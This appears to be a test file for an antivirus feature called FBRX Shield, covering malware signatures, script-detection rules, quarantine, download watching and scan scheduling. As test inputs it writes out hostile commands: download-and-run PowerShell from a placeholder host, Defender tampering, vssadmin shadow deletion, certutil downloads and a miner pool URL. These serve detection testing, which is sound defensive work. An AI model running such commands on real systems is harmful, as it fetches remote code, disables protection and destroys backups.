import { createHash } from 'node:crypto';
import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { lastScanDue, nextScanDue, scheduledScanDue, type AvProduct, type ProtectionStatus, type ScanJob, type ShieldDetection } from '@fbrx/shared';
import { decodeProductState } from '../src/protection/products';
import { isEicar, SCRIPT_RULES, zipEntryNames } from '../src/protection/shield';
import { makeKernel, tempDir, USER, waitFor } from './helpers';

const LOCAL_API = { origin: 'api' as const, actor: 'script' };
const EICAR = ['X5O!P%@AP[4\\PZX54(P^)7CC)7}$', 'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'].join('');

/** A ZIP with these (stored, empty-CRC) entries: enough for reading the names back. */
function makeZip(names: string[]): Buffer {
  const parts: Buffer[] = [];
  const central: Buffer[] = [];
  let offset = 0;
  for (const name of names) {
    const n = Buffer.from(name);
    const data = Buffer.from('MsgBox "hello"');
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt32LE(data.length, 18);
    local.writeUInt32LE(data.length, 22);
    local.writeUInt16LE(n.length, 26);
    const cd = Buffer.alloc(46);
    cd.writeUInt32LE(0x02014b50, 0);
    cd.writeUInt32LE(data.length, 20);
    cd.writeUInt32LE(data.length, 24);
    cd.writeUInt16LE(n.length, 28);
    cd.writeUInt32LE(offset, 42);
    parts.push(local, n, data);
    central.push(cd, n);
    offset += 30 + n.length + data.length;
  }
  const cdBuf = Buffer.concat(central);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(names.length, 8);
  end.writeUInt16LE(names.length, 10);
  end.writeUInt32LE(cdBuf.length, 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...parts, cdBuf, end]);
}

const sha256 = (s: string | Buffer) => createHash('sha256').update(s).digest('hex');

async function finished(kernel: Awaited<ReturnType<typeof makeKernel>>['kernel'], job: ScanJob): Promise<ScanJob> {
  return waitFor(async () => {
    const j = (await kernel.call('protection.job', undefined, USER)) as ScanJob | null;
    return j && j.id === job.id && j.state !== 'running' ? j : null;
  }, 30_000) as Promise<ScanJob>;
}

describe('FBRX Shield rules', () => {
  it('recognizes the antivirus test file, risky scripts, archive names and Windows Security Center states', async () => {
    expect(isEicar(Buffer.from(EICAR))).toBe(true);
    expect(isEicar(Buffer.from(`${EICAR}\r\n`))).toBe(true);
    expect(isEicar(Buffer.from(`hello ${EICAR}`))).toBe(false);

    const hits = (text: string) => SCRIPT_RULES.filter((r) => r.test.test(text)).map((r) => r.name);
    expect(hits('vssadmin.exe delete shadows /all /quiet')).toEqual(['Ransomware behavior']);
    expect(hits('Set-MpPreference -DisableRealtimeMonitoring $true')).toEqual(['Antivirus tampering']);
    expect(hits("IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')")).toEqual(['Download and run']);
    expect(hits(`powershell -nop -w hidden -enc ${'A'.repeat(120)}`)).toEqual(['Hidden PowerShell']);
    expect(hits('certutil -urlcache -split -f https://x.example/a.exe a.exe')).toEqual(['Built-in tool abuse']);
    expect(hits('{"pools":[{"url":"stratum+tcp://pool.example:3333"}]}')).toEqual(['Cryptocurrency miner']);
    expect(hits('Write-Host "Backing up your documents"; Copy-Item a b')).toEqual([]);

    const dir = tempDir('fbrx-zip-');
    writeFileSync(join(dir, 'a.zip'), makeZip(['readme.txt', 'docs/invoice.pdf.js']));
    expect(await zipEntryNames(join(dir, 'a.zip'))).toEqual(['readme.txt', 'docs/invoice.pdf.js']);
    writeFileSync(join(dir, 'b.zip'), 'not a zip');
    expect(await zipEntryNames(join(dir, 'b.zip'))).toBeNull();

    expect(decodeProductState(0x061100)).toEqual({ realtime: true, upToDate: true });
    expect(decodeProductState(0x060100)).toEqual({ realtime: false, upToDate: true });
    expect(decodeProductState(0x061110)).toEqual({ realtime: true, upToDate: false });
  });
});

describe('Choosing the antivirus', () => {
  it('picks an installed antivirus automatically, lets the person or the organization choose, and says when it slips', async () => {
    const { kernel, cleanup } = await makeKernel();
    let products: AvProduct[] = [{ id: 'sophos', name: 'Sophos Intercept X', realtime: true, upToDate: true, canScan: false, source: 'security-center' }];
    (kernel.protection as unknown as { d: { detect: () => Promise<AvProduct[]> } }).d.detect = async () => products;
    try {
      let st = (await kernel.call('protection.status', { refresh: true }, USER)) as ProtectionStatus;
      expect(st.choice).toBe('auto');
      expect(st.active).toEqual({ kind: 'product', id: 'sophos', name: 'Sophos Intercept X' });
      expect(st.state).toBe('protected');
      expect(st.options.map((o) => o.value)).toEqual(expect.arrayContaining(['auto', 'shield', 'defender', 'product:sophos']));
      expect(st.notes.join(' ')).toMatch(/Sophos Intercept X does its own scans/);
      // No scanner FBRX knows: a scan says so; FBRX Shield can still give a second opinion.
      await expect(kernel.call('protection.scan', { type: 'quick' }, USER)).rejects.toThrow(/no scanner FBRX can start/);

      products = [{ ...products[0], realtime: false }];
      st = (await kernel.call('protection.status', { refresh: true }, USER)) as ProtectionStatus;
      expect(st.state).toBe('at-risk');
      expect(st.problems).toContain('Sophos Intercept X is turned off.');
      expect(kernel.protection.summary()).toEqual({ provider: 'product', name: 'Sophos Intercept X', state: 'at-risk', realtime: false, threats: 0 });

      // The person picks FBRX Shield; the API cannot.
      await expect(kernel.call('protection.setProvider', { provider: 'shield' }, LOCAL_API)).rejects.toThrow();
      st = (await kernel.call('protection.setProvider', { provider: 'shield' }, USER)) as ProtectionStatus;
      expect(st.active.kind).toBe('shield');
      expect(kernel.settings.get().protection.provider).toBe('shield');
      // A product that is gone falls back to what is here, and says so.
      st = (await kernel.call('protection.setProvider', { provider: 'product:eset' }, USER)) as ProtectionStatus;
      expect(st.active.id).toBe('sophos');
      expect(st.problems.join(' ')).toMatch(/ESET is no longer on this computer/);
      await expect(kernel.call('protection.setProvider', { provider: 'nonsense!' }, USER)).rejects.toThrow(/Unknown antivirus/);

      // The organization decides from FBRX Command.
      kernel.settings.applyManaged({ protection: { provider: 'shield' } }, ['protection.provider']);
      st = (await kernel.call('protection.status', { refresh: true }, USER)) as ProtectionStatus;
      expect(st).toMatchObject({ managed: true, active: { kind: 'shield' } });
      await expect(kernel.call('protection.setProvider', { provider: 'auto' }, USER)).rejects.toThrow(/organization chooses/);
    } finally {
      await cleanup();
    }
  });
});

describe('The scheduled scan', () => {
  // Monday 12 October 2026, local time.
  const at = (d: number, h: number, m = 0) => new Date(2026, 9, d, h, m);

  it('runs at the chosen time each day, and catches up after the computer was off', () => {
    expect(lastScanDue('daily', '21:30', 1, at(12, 22))).toEqual(at(12, 21, 30));
    expect(lastScanDue('daily', '21:30', 1, at(12, 9))).toEqual(at(11, 21, 30));
    expect(nextScanDue('daily', '21:30', 1, at(12, 9))).toEqual(at(12, 21, 30));
    expect(scheduledScanDue('daily', '21:30', 1, at(12, 8).toISOString(), at(12, 21, 31))).toBe(true);
    expect(scheduledScanDue('daily', '21:30', 1, at(12, 21, 31).toISOString(), at(12, 23))).toBe(false);
    // Off at 21:30 on Monday, on again Tuesday morning: it scans then.
    expect(scheduledScanDue('daily', '21:30', 1, at(12, 8).toISOString(), at(13, 7))).toBe(true);
    expect(lastScanDue('off', '21:30', 1, at(12, 22))).toBeNull();
  });

  it('runs on the chosen day each week, and waits for its first time', () => {
    // Wednesdays at 13:00.
    expect(lastScanDue('weekly', '13:00', 3, at(12, 9))).toEqual(at(7, 13));
    expect(nextScanDue('weekly', '13:00', 3, at(12, 9))).toEqual(at(14, 13));
    expect(lastScanDue('weekly', '13:00', 3, at(14, 13))).toEqual(at(14, 13));
    expect(lastScanDue('weekly', '08:00', 1, at(12, 7))).toEqual(at(5, 8));
    expect(scheduledScanDue('weekly', '13:00', 3, at(12, 9).toISOString(), at(14, 13, 5))).toBe(true);
    expect(scheduledScanDue('weekly', '13:00', 3, null, at(14, 13, 5))).toBe(false);
  });

  it('starts a quick scan at its time in any edition, and a changed schedule waits for its next time', async () => {
    const { kernel, cleanup } = await makeKernel();
    const tick = (now: Date) => (kernel.protection as unknown as { scheduled(now: Date): void }).scheduled(now);
    try {
      kernel.settings.update({ protection: { shield: { schedule: 'daily', scheduleTime: '09:00' } } });
      tick(at(12, 8));
      tick(at(12, 8, 30));
      expect(await kernel.call('protection.job', undefined, USER)).toBeNull();
      tick(at(12, 9, 2));
      expect(await kernel.call('protection.job', undefined, USER)).toMatchObject({ type: 'quick', engine: 'shield' });
      await kernel.call('protection.cancelScan', undefined, USER);
      await waitFor(async () => ((await kernel.call('protection.job', undefined, USER)) as ScanJob | null)?.state !== 'running', 10_000);

      // Moved to the evening: today's 09:00 has gone, and nothing runs until 18:00.
      kernel.settings.update({ protection: { shield: { scheduleTime: '18:00' } } });
      const before = ((await kernel.call('protection.job', undefined, USER)) as ScanJob).id;
      tick(at(12, 9, 10));
      tick(at(12, 17));
      expect(((await kernel.call('protection.job', undefined, USER)) as ScanJob).id).toBe(before);
      tick(at(12, 18, 1));
      expect(((await kernel.call('protection.job', undefined, USER)) as ScanJob).id).not.toBe(before);
      await kernel.call('protection.cancelScan', undefined, USER);
    } finally {
      await cleanup();
    }
  });
});

describe('FBRX Shield on a computer', () => {
  it('updates its threat database, scans, quarantines malware, reports suspicious files, restores and remembers', async () => {
    const feed = createServer((req, res) => {
      if (req.url === '/locked') return void res.writeHead(401).end();
      res.writeHead(200, { 'content-type': 'text/plain' }).end(`# FBRX test feed\n${sha256('pretend malware sample 1')}\n${sha256('pretend malware sample 2')}, Trojan.Test\nnot a hash\n`);
    });
    await new Promise<void>((r) => feed.listen(0, '127.0.0.1', () => r()));
    const base = `http://127.0.0.1:${(feed.address() as AddressInfo).port}`;
    const { kernel, cleanup } = await makeKernel();
    try {
      kernel.settings.update({ protection: { provider: 'shield', shield: { feedUrl: `${base}/locked` } } });
      await expect(kernel.call('shield.updateSignatures', undefined, USER)).rejects.toThrow(/ABUSECH_AUTH_KEY/);
      kernel.settings.update({ protection: { shield: { feedUrl: `${base}/recent.txt` } } });
      expect(await kernel.call('shield.updateSignatures', undefined, USER)).toEqual({ added: 2, total: 2 });
      expect(await kernel.call('shield.updateSignatures', undefined, USER)).toEqual({ added: 0, total: 2 });

      const dir = tempDir('fbrx-scan-');
      writeFileSync(join(dir, 'notes.txt'), 'shopping list');
      writeFileSync(join(dir, 'sample.bin'), 'pretend malware sample 2');
      writeFileSync(join(dir, 'invoice.pdf.exe'), 'MZ pretend');
      writeFileSync(join(dir, 'photo‮gpj.exe'), 'MZ pretend');
      mkdirSync(join(dir, 'skip-me'));
      writeFileSync(join(dir, 'skip-me', 'sample.bin'), 'pretend malware sample 1');
      kernel.settings.update({ protection: { shield: { exclusions: [join(dir, 'skip-me')] } } });

      const job = (await kernel.call('protection.scan', { type: 'custom', path: dir }, USER)) as ScanJob;
      expect(job).toMatchObject({ engine: 'shield', engineName: 'FBRX Shield', state: 'running' });
      await expect(kernel.call('protection.scan', { type: 'quick' }, USER)).rejects.toThrow(/already running/);
      const done = await finished(kernel, job);
      expect(done).toMatchObject({ state: 'done', files: 4, found: 3 });
      const byName = Object.fromEntries(done.detections.map((d) => [d.path.split(/[\\/]/).pop()!, d]));
      expect(byName['sample.bin']).toMatchObject({ kind: 'malware', engine: 'signature', name: 'Trojan.Test', action: 'quarantined' });
      expect(byName['invoice.pdf.exe']).toMatchObject({ kind: 'suspicious', name: 'Disguised program', action: 'open' });
      expect(byName['photo‮gpj.exe']).toMatchObject({ kind: 'suspicious', name: 'Disguised file name' });
      expect(existsSync(join(dir, 'sample.bin'))).toBe(false);
      expect(existsSync(join(dir, 'skip-me', 'sample.bin'))).toBe(true);
      // Quarantined files are encrypted: not the original bytes.
      const qfile = readFileSync(join(kernel.paths.root, 'shield', 'quarantine', `${byName['sample.bin'].id}.q`));
      expect(qfile.toString()).not.toContain('pretend malware');

      let st = (await kernel.call('protection.status', { refresh: true }, USER)) as ProtectionStatus;
      expect(st.shield).toMatchObject({ signatures: 2, quarantined: 1, open: 2, lastScan: { type: 'custom', files: 4, found: 3 } });
      expect(st.state).toBe('attention');

      // Restore puts it back and trusts it; allow trusts a suspicious file; delete removes it.
      const restored = (await kernel.call('shield.act', { id: byName['sample.bin'].id, action: 'restore' }, USER)) as ShieldDetection;
      expect(restored.action).toBe('restored');
      expect(readFileSync(join(dir, 'sample.bin'), 'utf8')).toBe('pretend malware sample 2');
      await kernel.call('shield.act', { id: byName['invoice.pdf.exe'].id, action: 'delete' }, USER);
      expect(existsSync(join(dir, 'invoice.pdf.exe'))).toBe(false);
      await expect(kernel.call('shield.act', { id: byName['photo‮gpj.exe'].id, action: 'allow' }, LOCAL_API)).rejects.toThrow();
      await kernel.call('shield.act', { id: byName['photo‮gpj.exe'].id, action: 'allow' }, USER);
      const again = await finished(kernel, (await kernel.call('protection.scan', { type: 'custom', path: dir }, USER)) as ScanJob);
      expect(again.found).toBe(0);

      // The agent can look and scan (report only); quarantining is a change it must ask for.
      const status = await kernel.registry.get('shield.status')!.run({}, {} as any);
      expect(status.output).toMatch(/Protected by: FBRX Shield/);
      writeFileSync(join(dir, 'other.bin'), 'pretend malware sample 1');
      const scanned = await kernel.registry.get('shield.scan')!.run({ path: dir }, { signal: new AbortController().signal } as any);
      expect(scanned.output).toMatch(/Malware: Known malware/);
      expect(existsSync(join(dir, 'other.bin'))).toBe(true);
      expect(kernel.registry.get('shield.quarantine')!.risk).toBe('write');

      // Security → Check a file shows FBRX Shield's verdict too.
      const report = (await kernel.call('security.fileReport', { path: join(dir, 'other.bin') }, USER)) as { shield: { kind: string } | null };
      expect(report.shield).toMatchObject({ kind: 'malware' });
      st = (await kernel.call('protection.status', { refresh: true }, USER)) as ProtectionStatus;
      expect(st.state).toBe('at-risk');
    } finally {
      feed.close();
      await cleanup();
    }
  });

  it('checks new downloads as they arrive and raises an alert', async () => {
    const { kernel, cleanup } = await makeKernel({ start: false });
    const home = tempDir('fbrx-home-');
    const downloads = join(home, 'Downloads');
    mkdirSync(downloads);
    mkdirSync(join(home, 'Desktop'));
    kernel.platform.specialDirs = () => ({ home, documents: join(home, 'Documents'), desktop: join(home, 'Desktop'), downloads });
    kernel.settings.update({ protection: { provider: 'shield' } });
    try {
      await kernel.start();
      const found: ShieldDetection[] = [];
      kernel.events.on('shield.detected', (d) => found.push(d));
      expect(((await kernel.call('protection.status', { refresh: true }, USER)) as ProtectionStatus).shield.watching).toContain(downloads);
      // A browser's partial file is ignored; the finished download is checked.
      writeFileSync(join(downloads, 'statement.zip.crdownload'), 'partial');
      writeFileSync(join(downloads, 'statement.zip'), makeZip(['statement.pdf.js']));
      await waitFor(() => found.length > 0, 15_000);
      expect(found).toHaveLength(1);
      expect(found[0]).toMatchObject({ source: 'download', kind: 'suspicious', name: 'Archive hides a script' });
      const alerts = (await kernel.call('alerts.inbox', { limit: 5 }, USER)) as Array<{ ruleId: string; title: string }>;
      expect(alerts.find((a) => a.ruleId === 'shield_threat')?.title).toBe('FBRX Shield: Archive hides a script');
      // Trusting the file clears its alert too (no second stop in Alerts).
      await kernel.call('shield.act', { id: found[0].id, action: 'allow' }, USER);
      const after = (await kernel.call('alerts.inbox', { limit: 5 }, USER)) as Array<{ ruleId: string }>;
      expect(after.filter((a) => a.ruleId === 'shield_threat')).toEqual([]);

      if (process.platform !== 'win32') {
        // The antivirus test file (Windows' own antivirus would take it first on Windows).
        writeFileSync(join(downloads, 'eicar.com'), EICAR);
        await waitFor(() => found.some((d) => d.kind === 'test'), 15_000);
        expect(found.find((d) => d.kind === 'test')).toMatchObject({ name: 'EICAR test file', action: 'quarantined' });
        expect(existsSync(join(downloads, 'eicar.com'))).toBe(false);
      }

      // Turned off: nothing is watched.
      kernel.settings.update({ protection: { shield: { watchDownloads: false } } });
      expect(((await kernel.call('protection.status', { refresh: true }, USER)) as ProtectionStatus).shield.watching).toEqual([]);
    } finally {
      await cleanup();
    }
  });

  it('never flags FBRX itself, tells about a scan once, and lets the person trust many at once', async () => {
    const { kernel, cleanup } = await makeKernel({ start: false });
    const home = tempDir('fbrx-home-');
    const downloads = join(home, 'Downloads');
    mkdirSync(downloads);
    mkdirSync(join(home, 'Desktop'));
    kernel.platform.specialDirs = () => ({ home, documents: join(home, 'Documents'), desktop: join(home, 'Desktop'), downloads });
    kernel.settings.update({ protection: { provider: 'shield', shield: { watchDownloads: false } } });
    try {
      await kernel.start();
      // FBRX's source, unzipped and built in Downloads: thousands of scripts that look like downloads.
      const src = join(downloads, 'FBRX-1.9.8');
      mkdirSync(join(src, 'apps', 'desktop'), { recursive: true });
      mkdirSync(join(src, 'node_modules', 'left-pad'), { recursive: true });
      writeFileSync(join(src, 'package.json'), JSON.stringify({ name: 'fbrx-os' }));
      writeFileSync(join(src, 'node_modules', 'left-pad', 'index.js'), 'module.exports = 1');
      writeFileSync(join(src, 'apps', 'desktop', 'setup.ps1'), 'iwr https://x.example/a.ps1 | iex');
      // Someone else's project in Downloads: its packages' code does not count as downloaded either.
      mkdirSync(join(downloads, 'site', 'node_modules', 'x'), { recursive: true });
      writeFileSync(join(downloads, 'site', 'node_modules', 'x', 'index.js'), 'module.exports = 1');
      // Real downloads that look suspicious.
      writeFileSync(join(downloads, 'invoice.js'), 'WScript.Echo(1)');
      mkdirSync(join(downloads, 'batch'));
      for (const n of ['a', 'b', 'c']) writeFileSync(join(downloads, 'batch', `${n}.pdf.exe`), 'MZ');
      const shieldAlerts = async () => ((await kernel.call('alerts.inbox', { limit: 50 }, USER)) as Array<{ ruleId: string; title: string }>).filter((a) => a.ruleId === 'shield_threat');

      const done = await finished(kernel, (await kernel.call('protection.scan', { type: 'custom', path: downloads }, USER)) as ScanJob);
      expect(done.detections.map((d) => d.path.split(/[\\/]/).pop()).sort()).toEqual(['a.pdf.exe', 'b.pdf.exe', 'c.pdf.exe', 'invoice.js']);
      // One alert for the whole scan, not one per file.
      expect((await shieldAlerts()).map((a) => a.title)).toEqual(['FBRX Shield found 4 items']);
      // Scanning inside FBRX's folder finds nothing.
      expect((await finished(kernel, (await kernel.call('protection.scan', { type: 'custom', path: join(src, 'apps') }, USER)) as ScanJob)).files).toBe(0);

      // Trust everything suspicious in one folder, then the rest; only the person can.
      await expect(kernel.call('shield.allowMany', {}, LOCAL_API)).rejects.toThrow();
      expect(await kernel.call('shield.allowMany', { folder: join(downloads, 'batch') }, USER)).toEqual({ allowed: 3 });
      expect(await kernel.call('shield.allowMany', {}, USER)).toEqual({ allowed: 1 });
      expect(((await kernel.call('protection.status', { refresh: true }, USER)) as ProtectionStatus).shield.open).toBe(0);

      // New downloads tell one by one, three a minute at most; the rest wait to be counted in one alert.
      const before = (await shieldAlerts()).length;
      for (let i = 0; i < 6; i++) {
        kernel.protection.onDetection({ id: `shd_burst${i}`, path: join(downloads, `x${i}.js`), sha256: null, size: 1, kind: 'suspicious', name: 'Risky file from the internet', engine: 'heuristic', reason: '', source: 'download', at: new Date().toISOString(), action: 'open', actionAt: null });
      }
      await waitFor(async () => (await shieldAlerts()).length >= before + 3);
      expect((await shieldAlerts()).length).toBe(before + 3);
    } finally {
      await cleanup();
    }
  });

  it('clears findings it would no longer flag, and ones whose file is gone', async () => {
    const { kernel, cleanup } = await makeKernel();
    try {
      // Findings an older FBRX Shield recorded: a file in a copy of FBRX, one that is gone, and a real one.
      const src = tempDir('fbrx-src-');
      mkdirSync(join(src, 'apps', 'desktop'), { recursive: true });
      writeFileSync(join(src, 'package.json'), JSON.stringify({ name: 'fbrx-os' }));
      writeFileSync(join(src, 'tool.js'), 'x');
      const other = tempDir('fbrx-dl-');
      writeFileSync(join(other, 'invoice.pdf.exe'), 'MZ');
      const old = (name: string) => ({ verdict: { kind: 'suspicious' as const, engine: 'heuristic' as const, name, reason: 'an older rule' }, sha256: null, size: 1 });
      kernel.shield.record(join(src, 'tool.js'), old('Risky file from the internet'), 'scan');
      kernel.shield.record(join(other, 'gone.js'), old('Risky file from the internet'), 'scan');
      kernel.shield.record(join(other, 'invoice.pdf.exe'), old('Disguised program'), 'scan');
      expect(await kernel.call('shield.recheck', undefined, USER)).toEqual({ cleared: 1, gone: 1 });
      expect(kernel.shield.detections().filter((d) => d.action === 'open').map((d) => d.path)).toEqual([join(other, 'invoice.pdf.exe')]);
    } finally {
      await cleanup();
    }
  });

  it('never watches the home folder itself, even when it is reported as Downloads', async () => {
    const { kernel, cleanup } = await makeKernel({ start: false });
    const home = tempDir('fbrx-home-');
    kernel.platform.specialDirs = () => ({ home, documents: home, desktop: home, downloads: home });
    try {
      await kernel.start();
      const st = (await kernel.call('protection.status', { refresh: true }, USER)) as ProtectionStatus;
      expect(st.shield.watching).toEqual([]);
      expect(kernel.protection.targets('quick')).not.toContain(home);
    } finally {
      await cleanup();
    }
  });
});
